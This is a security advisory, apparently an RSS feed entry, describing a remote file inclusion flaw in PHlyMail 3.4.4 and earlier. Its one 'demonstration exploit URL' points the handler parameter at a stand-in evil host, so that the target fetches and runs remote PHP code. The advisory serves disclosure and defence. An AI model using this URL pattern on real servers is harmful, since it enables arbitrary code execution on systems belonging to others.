				<title>PHlyMail Include File Bug in '_PM_['path']['handler']' </title>
				<description><![CDATA[ <b>PHlyMail Include File Bug in '_PM_['path']['handler']' Parameter Lets Remote Users Execute Arbitrary</b>

<u>Version(s):</u> 3.4.4 and prior versions
Description:  A vulnerability was reported in PHlyMail. A remote user can include and execute arbitrary code on the target system.

The 'handlers/email/mod.listmail.php' script does not properly validate user-supplied input in the '_PM_['path']['handler']' parameter. A remote user can supply a specially crafted URL to cause the target system to include and execute arbitrary PHP code from a remote location. The PHP code, including operating system commands, will run with the privileges of the target web service.

<i>A demonstration exploit URL is provided:</i>

<i>+http://[target]/[phlymail_path]/handlers/email/mod.listmail.php?_PM_[path][handler]=[http://www.myevilsite.com/evil_scripts.txt]</i>

Kacper (a.k.a Rahim) discovered this vulnerability.
Impact:  A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.]]></description>
